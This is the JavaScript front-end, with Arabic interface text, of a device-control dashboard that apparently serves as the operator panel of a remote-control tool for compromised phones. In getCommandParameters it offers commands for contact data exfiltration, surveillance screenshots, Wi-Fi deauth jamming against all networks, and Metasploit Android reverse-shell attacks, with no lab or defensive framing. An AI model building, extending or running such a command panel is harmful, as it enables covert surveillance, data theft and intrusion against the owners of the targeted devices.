/**
 * Dashboard Interactive JavaScript
 * Enhanced Web Interface with Real-time Communication
 */

// Global Variables
let socket = null;
let selectedDevice = null;
let devices = [];
let commandHistory = [];
let isConnected = false;

// Initialize Dashboard
document.addEventListener('DOMContentLoaded', function() {
    console.log('🚀 تهيئة لوحة التحكم التفاعلية...');
    initializeSocketIO();
    setupEventListeners();
    loadInitialData();
    startAutoRefresh();
});

/**
 * Initialize Socket.IO Connection
 */
function initializeSocketIO() {
    try {
        socket = io();
        
        socket.on('connect', function() {
            console.log('✅ متصل بالخادم');
            isConnected = true;
            updateConnectionStatus(true);
            showNotification('تم الاتصال بالخادم بنجاح', 'success');
        });
        
        socket.on('disconnect', function() {
            console.log('❌ انقطع الاتصال بالخادم');
            isConnected = false;
            updateConnectionStatus(false);
            showNotification('انقطع الاتصال بالخادم', 'warning');
        });
        
        socket.on('device_update', function(data) {
            console.log('📱 تحديث الجهاز:', data);
            updateDeviceStatus(data);
        });
        
        socket.on('command_result', function(data) {
            console.log('⚡ نتيجة الأمر:', data);
            showCommandResult(data);
            addToCommandHistory(data);
        });
        
        socket.on('error', function(error) {
            console.error('❌ خطأ في Socket.IO:', error);
            showNotification('خطأ في الاتصال', 'error');
        });
        
    } catch (error) {
        console.error('❌ خطأ في تهيئة Socket.IO:', error);
        showNotification('فشل في الاتصال بالخادم', 'error');
    }
}

/**
 * Setup Event Listeners
 */
function setupEventListeners() {
    // Refresh Devices Button
    const refreshBtn = document.getElementById('refresh-devices');
    if (refreshBtn) {
        refreshBtn.addEventListener('click', function() {
            loadDevices();
            showNotification('جاري تحديث الأجهزة...', 'info');
        });
    }
    
    // Execute Command Button
    const executeBtn = document.getElementById('execute-command');
    if (executeBtn) {
        executeBtn.addEventListener('click', function() {
            executeCommand();
        });
    }
    
    // Device Selection
    const deviceSelect = document.getElementById('selected-device');
    if (deviceSelect) {
        deviceSelect.addEventListener('change', function() {
            selectedDevice = this.value;
            console.log('📱 تم اختيار الجهاز:', selectedDevice);
            updateDeviceInfo();
        });
    }
    
    // Command Type Selection
    const commandSelect = document.getElementById('command-type');
    if (commandSelect) {
        commandSelect.addEventListener('change', function() {
            updateCommandParameters(this.value);
        });
    }
    
    // Keyboard Shortcuts
    document.addEventListener('keydown', function(e) {
        if (e.ctrlKey && e.key === 'r') {
            e.preventDefault();
            loadDevices();
        }
        if (e.ctrlKey && e.key === 'Enter') {
            e.preventDefault();
            executeCommand();
        }
    });
}

/**
 * Load Initial Data
 */
async function loadInitialData() {
    try {
        await Promise.all([
            loadDevices(),
            loadSystemStats(),
            loadCommandHistory()
        ]);
        showNotification('تم تحميل البيانات بنجاح', 'success');
    } catch (error) {
        console.error('❌ خطأ في تحميل البيانات الأولية:', error);
        showNotification('خطأ في تحميل البيانات', 'error');
    }
}

/**
 * Load Devices from Server
 */
async function loadDevices() {
    try {
        showLoading('جاري تحميل الأجهزة...');
        
        const response = await fetch('/api/devices', {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'Cache-Control': 'no-cache'
            }
        });
        
        if (!response.ok) {
            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
        }
        
        const data = await response.json();
        
        if (data.success) {
            devices = data.devices || [];
            updateDevicesTable();
            updateDevicesSelect();
            updateStats();
            hideLoading();
            console.log(`✅ تم تحميل ${devices.length} جهاز`);
        } else {
            throw new Error(data.error || 'خطأ في تحميل الأجهزة');
        }
        
    } catch (error) {
        console.error('❌ خطأ في تحميل الأجهزة:', error);
        hideLoading();
        showNotification(`خطأ في تحميل الأجهزة: ${error.message}`, 'error');
    }
}

/**
 * Update Devices Table
 */
function updateDevicesTable() {
    const tbody = document.getElementById('devices-tbody');
    if (!tbody) return;
    
    tbody.innerHTML = '';
    
    if (devices.length === 0) {
        tbody.innerHTML = `
            <tr>
                <td colspan="5" class="text-center text-muted">
                    <i class="fas fa-info-circle"></i>
                    لا توجد أجهزة متصلة
                </td>
            </tr>
        `;
        return;
    }
    
    devices.forEach(device => {
        const row = document.createElement('tr');
        row.setAttribute('data-device-id', device.device_id);
        row.className = 'fade-in';
        
        const lastSeen = new Date(device.last_seen);
        const isOnline = (Date.now() - lastSeen.getTime()) < 300000; // 5 minutes
        
        row.innerHTML = `
            <td>
                <div class="d-flex align-items-center">
                    <i class="fas fa-mobile-alt me-2 text-primary"></i>
                    <div>
                        <strong>${device.device_name || 'جهاز غير معروف'}</strong>
                        <br><small class="text-muted">${device.device_id}</small>
                    </div>
                </div>
            </td>
            <td>
                <span class="badge bg-info">${device.device_type || 'غير محدد'}</span>
            </td>
            <td>
                <span class="badge ${isOnline ? 'bg-success' : 'bg-secondary'}">
                    ${isOnline ? 'متصل' : 'غير متصل'}
                </span>
            </td>
            <td>
                <small class="text-muted">
                    ${lastSeen.toLocaleString('ar-SA')}
                </small>
            </td>
            <td>
                <div class="btn-group btn-group-sm">
                    <button class="btn btn-primary" onclick="selectDevice('${device.device_id}')" title="اختيار الجهاز">
                        <i class="fas fa-check"></i>
                    </button>
                    <button class="btn btn-info" onclick="getDeviceStatus('${device.device_id}')" title="حالة الجهاز">
                        <i class="fas fa-info"></i>
                    </button>
                    <button class="btn btn-warning" onclick="monitorDevice('${device.device_id}')" title="مراقبة الجهاز">
                        <i class="fas fa-eye"></i>
                    </button>
                </div>
            </td>
        `;
        
        tbody.appendChild(row);
    });
}

/**
 * Update Devices Select Dropdown
 */
function updateDevicesSelect() {
    const select = document.getElementById('selected-device');
    if (!select) return;
    
    select.innerHTML = '<option value="">اختر جهاز...</option>';
    
    devices.forEach(device => {
        const option = document.createElement('option');
        option.value = device.device_id;
        option.textContent = `${device.device_name || 'جهاز غير معروف'} (${device.device_id})`;
        select.appendChild(option);
    });
}

/**
 * Update Statistics
 */
function updateStats() {
    const connectedDevices = devices.filter(d => {
        const lastSeen = new Date(d.last_seen);
        return (Date.now() - lastSeen.getTime()) < 300000;
    }).length;
    
    const activeAlerts = commandHistory.filter(cmd => cmd.status === 'error').length;
    const threatLevel = Math.min(activeAlerts * 2, 10);
    
    // Update DOM elements
    const elements = {
        'connected-devices': connectedDevices,
        'active-alerts': activeAlerts,
        'threat-level': `${threatLevel}/10`,
        'monitoring-sessions': devices.length
    };
    
    Object.entries(elements).forEach(([id, value]) => {
        const element = document.getElementById(id);
        if (element) {
            element.textContent = value;
        }
    });
    
    // Update threat indicator
    const threatIndicator = document.getElementById('threat-indicator');
    if (threatIndicator) {
        threatIndicator.className = `status-indicator ${threatLevel > 5 ? 'status-warning' : 'status-online'}`;
    }
}

/**
 * Select Device
 */
function selectDevice(deviceId) {
    selectedDevice = deviceId;
    const select = document.getElementById('selected-device');
    if (select) {
        select.value = deviceId;
    }
    
    const device = devices.find(d => d.device_id === deviceId);
    if (device) {
        showNotification(`تم اختيار الجهاز: ${device.device_name || deviceId}`, 'success');
        updateDeviceInfo();
    }
}

/**
 * Get Device Status
 */
async function getDeviceStatus(deviceId) {
    try {
        showLoading('جاري جلب حالة الجهاز...');
        
        const response = await fetch(`/api/devices/${deviceId}/status`);
        const data = await response.json();
        
        hideLoading();
        
        if (data.error) {
            showNotification(`خطأ: ${data.error}`, 'error');
        } else {
            showDeviceStatusModal(deviceId, data);
        }
        
    } catch (error) {
        console.error('❌ خطأ في جلب حالة الجهاز:', error);
        hideLoading();
        showNotification('خطأ في الاتصال', 'error');
    }
}

/**
 * Monitor Device
 */
function monitorDevice(deviceId) {
    if (socket && isConnected) {
        socket.emit('join_device_monitoring', { device_id: deviceId });
        showNotification(`تم بدء مراقبة الجهاز: ${deviceId}`, 'info');
    } else {
        showNotification('لا يمكن مراقبة الجهاز - الاتصال غير متوفر', 'warning');
    }
}

/**
 * Execute Command
 */
async function executeCommand() {
    if (!selectedDevice) {
        showNotification('يرجى اختيار جهاز أولاً', 'warning');
        return;
    }
    
    const commandType = document.getElementById('command-type')?.value;
    if (!commandType) {
        showNotification('يرجى اختيار نوع الأمر', 'warning');
        return;
    }
    
    try {
        showLoading('جاري تنفيذ الأمر...');
        
        const response = await fetch('/api/command', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                device_id: selectedDevice,
                command: commandType,
                parameters: getCommandParameters(commandType)
            })
        });
        
        const data = await response.json();
        hideLoading();
        
        showCommandResult(data);
        addToCommandHistory({
            device_id: selectedDevice,
            command: commandType,
            result: data,
            timestamp: new Date().toISOString()
        });
        
    } catch (error) {
        console.error('❌ خطأ في تنفيذ الأمر:', error);
        hideLoading();
        showNotification('خطأ في تنفيذ الأمر', 'error');
    }
}

/**
 * Get Command Parameters
 */
function getCommandParameters(commandType) {
    const params = {};
    
    switch (commandType) {
        case 'data_exfiltration':
            params.type = 'contacts';
            params.action = 'backup_all';
            params.format = 'json';
            break;
        case 'surveillance':
            params.action = 'screenshot';
            params.quality = 'high';
            params.format = 'png';
            break;
        case 'wifi_jamming':
            params.attack_type = 'deauth';
            params.target_ssid = 'all';
            params.duration = 60;
            break;
        case 'mobile_attack':
            params.attack_type = 'metasploit';
            params.target_os = 'android';
            params.payload_type = 'reverse_shell';
            break;
        case 'system_control':
            params.action = 'get_info';
            params.include = ['os', 'hardware', 'network'];
            break;
        case 'tool_execution':
            params.tool = 'metasploit';
            params.action = 'start';
            params.console = true;
            break;
    }
    
    return params;
}

/**
 * Show Command Result
 */
function showCommandResult(data) {
    const resultsDiv = document.getElementById('command-results');
    if (!resultsDiv) return;
    
    const timestamp = new Date().toLocaleString('ar-SA');
    
    if (data.error) {
        resultsDiv.innerHTML = `
            <div class="alert alert-danger fade-in">
                <div class="d-flex align-items-center">
                    <i class="fas fa-exclamation-triangle me-2"></i>
                    <div>
                        <strong>خطأ في تنفيذ الأمر</strong>
                        <br><small class="text-muted">${timestamp}</small>
                        <br>${data.error}
                    </div>
                </div>
            </div>
        `;
    } else {
        resultsDiv.innerHTML = `
            <div class="alert alert-success fade-in">
                <div class="d-flex align-items-center">
                    <i class="fas fa-check-circle me-2"></i>
                    <div>
                        <strong>تم تنفيذ الأمر بنجاح</strong>
                        <br><small class="text-muted">${timestamp}</small>
                    </div>
                </div>
                <pre class="mt-2">${JSON.stringify(data, null, 2)}</pre>
            </div>
        `;
    }
    
    // Scroll to results
    resultsDiv.scrollIntoView({ behavior: 'smooth' });
}

/**
 * Add to Command History
 */
function addToCommandHistory(commandData) {
    commandHistory.unshift(commandData);
    
    // Keep only last 50 commands
    if (commandHistory.length > 50) {
        commandHistory = commandHistory.slice(0, 50);
    }
    
    // Save to localStorage
    try {
        localStorage.setItem('commandHistory', JSON.stringify(commandHistory));
    } catch (error) {
        console.warn('لا يمكن حفظ سجل الأوامر:', error);
    }
}

/**
 * Load Command History
 */
function loadCommandHistory() {
    try {
        const saved = localStorage.getItem('commandHistory');
        if (saved) {
            commandHistory = JSON.parse(saved);
        }
    } catch (error) {
        console.warn('لا يمكن تحميل سجل الأوامر:', error);
        commandHistory = [];
    }
}

/**
 * Update Connection Status
 */
function updateConnectionStatus(connected) {
    const statusElement = document.getElementById('connection-status');
    if (statusElement) {
        statusElement.className = `status-indicator ${connected ? 'status-online' : 'status-offline'}`;
    }
    
    const statusText = document.querySelector('[data-status-text]');
    if (statusText) {
        statusText.textContent = connected ? 'متصل بالخادم' : 'غير متصل';
    }
}

/**
 * Show Notification
 */
function showNotification(message, type = 'info') {
    const notificationArea = document.getElementById('notification-area');
    if (!notificationArea) return;
    
    const alertClass = {
        'error': 'alert-danger',
        'success': 'alert-success',
        'warning': 'alert-warning',
        'info': 'alert-info'
    }[type] || 'alert-info';
    
    const icon = {
        'error': 'fas fa-exclamation-triangle',
        'success': 'fas fa-check-circle',
        'warning': 'fas fa-exclamation-circle',
        'info': 'fas fa-info-circle'
    }[type] || 'fas fa-info-circle';
    
    const notification = document.createElement('div');
    notification.className = `alert ${alertClass} alert-dismissible fade show slide-in`;
    notification.innerHTML = `
        <div class="d-flex align-items-center">
            <i class="${icon} me-2"></i>
            <div>${message}</div>
        </div>
        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
    `;
    
    notificationArea.appendChild(notification);
    
    // Auto remove after 5 seconds
    setTimeout(() => {
        if (notification.parentNode) {
            notification.remove();
        }
    }, 5000);
}

/**
 * Show Loading
 */
function showLoading(message = 'جاري التحميل...') {
    const loadingDiv = document.createElement('div');
    loadingDiv.id = 'loading-overlay';
    loadingDiv.className = 'position-fixed top-0 start-0 w-100 h-100 d-flex align-items-center justify-content-center';
    loadingDiv.style.cssText = `
        background: rgba(0,0,0,0.5);
        z-index: 9999;
        backdrop-filter: blur(5px);
    `;
    loadingDiv.innerHTML = `
        <div class="text-center text-white">
            <div class="loading mb-3"></div>
            <div>${message}</div>
        </div>
    `;
    
    document.body.appendChild(loadingDiv);
}

/**
 * Hide Loading
 */
function hideLoading() {
    const loadingDiv = document.getElementById('loading-overlay');
    if (loadingDiv) {
        loadingDiv.remove();
    }
}

/**
 * Start Auto Refresh
 */
function startAutoRefresh() {
    // Refresh devices every 30 seconds
    setInterval(() => {
        if (isConnected) {
            loadDevices();
        }
    }, 30000);
    
    // Update stats every 10 seconds
    setInterval(() => {
        updateStats();
    }, 10000);
}

/**
 * Update Device Status
 */
function updateDeviceStatus(data) {
    const deviceRow = document.querySelector(`[data-device-id="${data.device_id}"]`);
    if (deviceRow) {
        const statusCell = deviceRow.querySelector('.badge');
        if (statusCell) {
            statusCell.className = `badge ${data.status === 'active' ? 'bg-success' : 'bg-secondary'}`;
            statusCell.textContent = data.status === 'active' ? 'متصل' : 'غير متصل';
        }
    }
    
    // Update device in devices array
    const deviceIndex = devices.findIndex(d => d.device_id === data.device_id);
    if (deviceIndex !== -1) {
        devices[deviceIndex] = { ...devices[deviceIndex], ...data };
    }
    
    updateStats();
}

/**
 * Show Device Status Modal
 */
function showDeviceStatusModal(deviceId, statusData) {
    const modal = document.createElement('div');
    modal.className = 'modal fade';
    modal.id = 'deviceStatusModal';
    modal.innerHTML = `
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-info-circle"></i>
                        حالة الجهاز: ${deviceId}
                    </h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <pre>${JSON.stringify(statusData, null, 2)}</pre>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">إغلاق</button>
                </div>
            </div>
        </div>
    `;
    
    document.body.appendChild(modal);
    
    const modalInstance = new bootstrap.Modal(modal);
    modalInstance.show();
    
    modal.addEventListener('hidden.bs.modal', function() {
        modal.remove();
    });
}

/**
 * Load System Stats
 */
async function loadSystemStats() {
    // This would typically load from the server
    // For now, we'll just update the UI
    updateStats();
}

// Export functions for global access
window.dashboardFunctions = {
    selectDevice,
    getDeviceStatus,
    monitorDevice,
    executeCommand,
    showNotification,
    loadDevices
};